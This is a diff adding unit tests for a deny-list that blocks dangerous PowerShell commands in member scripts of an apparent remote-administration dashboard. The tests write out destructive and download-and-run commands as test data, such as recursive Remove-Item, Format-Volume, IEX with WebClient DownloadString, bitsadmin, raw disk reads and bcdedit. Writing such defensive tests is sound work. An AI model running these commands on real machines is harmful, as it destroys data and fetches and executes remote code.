@@ -636,3 +636,84 @@ test('checkHostOnline: force=true bypasses check', async () => {
     assert.equal(r.online, true);
   });
 });
+
+// ── 2026-09-09 S82 (security) — deny-list patterns on member scripts ──
+
+test('containsDeniedPattern: detects Remove-Item -Recurse / -Force / -r / -rf', () => {
+  const { containsDeniedPattern } = _testInternals;
+  for (const s of [
+    'Remove-Item C:\foo -Recurse',
+    'Remove-Item C:\foo -Force',
+    'Remove-Item -r C:\foo',
+    'Remove-Item -rf C:\foo'
+  ]) {
+    assert.ok(containsDeniedPattern(s), `must reject: ${s}`);
+  }
+});
+
+test('containsDeniedPattern: detects Format-Volume / Stop-Computer / Restart-Computer', () => {
+  const { containsDeniedPattern } = _testInternals;
+  assert.ok(containsDeniedPattern('Format-Volume -DriveLetter C'));
+  assert.ok(containsDeniedPattern('Stop-Computer -Force'));
+  assert.ok(containsDeniedPattern('Restart-Computer -Force'));
+});
+
+test('containsDeniedPattern: detects Invoke-Expression / IEX', () => {
+  const { containsDeniedPattern } = _testInternals;
+  assert.ok(containsDeniedPattern('Invoke-Expression "evil"'));
+  assert.ok(containsDeniedPattern('IEX (New-Object Net.WebClient).DownloadString("http://x")'));
+});
+
+test('containsDeniedPattern: detects New-Object Net.WebClient / Start-BitsTransfer / bitsadmin', () => {
+  const { containsDeniedPattern } = _testInternals;
+  assert.ok(containsDeniedPattern('New-Object Net.WebClient'));
+  assert.ok(containsDeniedPattern('Start-BitsTransfer -Source http://x -Destination y'));
+  assert.ok(containsDeniedPattern('bitsadmin /transfer myJob http://x c:\y'));
+});
+
+test('containsDeniedPattern: detects wget / curl / device escape / reg delete', () => {
+  const { containsDeniedPattern } = _testInternals;
+  assert.ok(containsDeniedPattern('wget http://x -OutFile y'));
+  assert.ok(containsDeniedPattern('curl http://x'));
+  assert.ok(containsDeniedPattern('Get-Content \\\\.\\PhysicalDrive0'));
+  assert.ok(containsDeniedPattern('reg delete HKLM\\...\\CurrentControlSet\\Services\\foo'));
+});
+
+test('containsDeniedPattern: detects bcdedit / diskpart / Stop-Process -Force', () => {
+  const { containsDeniedPattern } = _testInternals;
+  assert.ok(containsDeniedPattern('bcdedit /set {bootmgr} displaybootmenu yes'));
+  assert.ok(containsDeniedPattern('diskpart /s script.txt'));
+  assert.ok(containsDeniedPattern('Get-Process | Stop-Process -Name explorer -Force'));
+});
+
+test('containsDeniedPattern: returns null for benign scripts', () => {
+  const { containsDeniedPattern } = _testInternals;
+  for (const s of [
+    'Get-Process',
+    'Get-Service | Where-Object Status -eq Running',
+    'Restart-Service spooler',
+    'Set-NetFirewallRule -DisplayName "x" -Enabled False',
+    'Get-ChildItem C:\\addashboard\\logs',
+    'Get-Date'
+  ]) {
+    assert.equal(containsDeniedPattern(s), null, `must accept: ${s}`);
+  }
+});
+
+test('queueCommand: rejects Remove-Item -Recurse script with 400', async () => {
+  await withDb(buildDbFor(makeStore(), { onlineHosts: new Set(['H1']) }), async () => {
+    await assert.rejects(
+      queueCommand({ hostname: 'H1', params: { script: 'Remove-Item C:\\foo -Recurse' } }),
+      (e) => e.httpStatus === 400 && /denied pattern/i.test(e.message)
+    );
+  });
+});
+
+test('queueCommand: rejects Stop-Process -Force script with 400', async () => {
+  await withDb(buildDbFor(makeStore(), { onlineHosts: new Set(['H1']) }), async () => {
+    await assert.rejects(
+      queueCommand({ hostname: 'H1', params: { script: 'Get-Process | Stop-Process -Name explorer -Force' } }),
+      (e) => e.httpStatus === 400 && /denied pattern/i.test(e.message)
+    );
+  });
+});
